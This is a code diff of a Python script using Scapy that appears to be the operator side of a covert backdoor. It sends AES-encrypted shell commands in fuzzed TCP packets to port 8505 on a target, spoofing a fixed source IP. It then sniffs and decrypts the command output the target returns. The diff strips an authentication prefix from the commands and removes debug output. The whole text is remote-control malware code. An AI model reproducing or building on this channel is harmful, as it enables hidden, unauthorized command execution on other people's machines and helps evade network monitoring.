@@ -35,7 +35,7 @@ def sendCommand():
             #Prompt user for the command they want to send
             command = raw_input('Write your command: ')
             #Encrypt the command with AES encryption
-            encryptedCommand = crypt.encrypt(authPacket + command)
+            encryptedCommand = crypt.encrypt(command)
             #Create the packet and store the command in the data field
             pkt = IP(src="192.168.0.14", dst=destIP)/fuzz(TCP(dport=8505))/Raw(load=encryptedCommand)
             #Send the packet
@@ -47,14 +47,10 @@ def sendCommand():
 
 def receiveOutput(pkt):
     global destIP
-    pkt.show()
     if ARP in pkt:
-        return
-    elif DHCP in pkt:
         return
     elif pkt[IP].src == destIP:
         #grab the raw data
-        pkt.show()
         data = pkt[Raw].load
         #Decrypt the data
         decryptedData = crypt.decrypt(data)
